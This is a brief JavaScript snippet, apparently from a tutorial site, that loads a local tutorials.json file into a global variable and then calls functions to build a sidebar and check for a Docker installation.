fetch('tutorials.json')
  .then(res => res.json())
  .then(data => { window.TUTORIALS = data; })
  .catch(err => console.error("Failed to load tutorials:", err));

buildSidebar();
checkDockerInstallation();

